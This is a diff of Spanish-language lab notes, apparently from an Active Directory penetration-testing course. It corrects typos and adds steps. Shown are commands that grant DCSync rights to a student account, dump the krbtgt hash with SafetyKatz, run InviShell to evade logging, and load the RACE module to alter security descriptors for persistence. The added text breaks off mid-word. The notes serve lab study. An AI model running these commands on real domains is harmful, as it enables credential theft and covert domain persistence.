@@ -1025,18 +1025,31 @@ Ahora ya podemos añadir la regla a nuestro estudiante
 Add-DomainObjectAcl -TargetIdentity 'DC=dollarcorp,DC=moneycorp,DC=local' -PrincipalIdentity student97 -Rights DCSync -PrincipalDomain dollarcorp.moneycorp.local -TargetDomain dollarcorp.moneycorp.local -Verbose
 ```
 
-Saldrmeos de la shell y enumeraremos de nuevo los derechos
+Saldremos de la shell y enumeraremos de nuevo los derechos
 ```shell
 [student97]
 Get-DomainObjectAcl -SearchBase "DC=dollarcorp,DC=moneycorp,DC=local" -SearchScope Base -ResolveGUIDs | ?{($_.ObjectAceType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll')} | ForEach-Object {$_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier);$_} | ?{$_.IdentityName -match "student97"}
 ```
 
-Viendo que ahora tenemos *Acces Allowed*, gracias a esto ahora con el usuario *student97* podremos obtener el hashs de *krbtgt* o cualquier otro ususario
+Viendo que ahora tenemos *Acces Allowed*, gracias a esto ahora con el usuario *student97* podremos obtener el hash de *krbtgt* o cualquier otro usuario
 ```shell
 C:\AD\Tools\SafetyKatz.exe -args "lsadump::evasive-dcsync /user:dcorp\krbtgt" "exit"
 ```
 
 *LO - 13*
-Modificar los descriptores de seguridad en dcorp-dcPara obtener acceso mediante el control remoto de PowerShell y WMI sin necesidad de acceso de administrador.
+Modificar los descriptores de seguridad en *dcorp-dc* para obtener acceso mediante el control remoto de PowerShell y WMI sin necesidad de acceso de administrador.
 
-Para poder llevar a acabo esta modificacion una vez que tenemos privilegios administrativos en una maquina podemos modificar los descriptores de seguridad de los servicios para poder acceder a estos sin privilegios administrativos
+Para poder llevar a acabo esta modificacion una vez que tenemos privilegios administrativos en una maquina podemos modificar los descriptores de seguridad de los servicios para poder acceder a estos sin privilegios administrativos.
+Primero deveremos de wjwcutar una *InviShell*
+```shell
+[student97]
+C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
+```
+
+Cargar el modulo *RACE*
+```shell
+[studnet97]
+. C:\AD\Tools\RACE.ps1
+```
+
+Y a contin
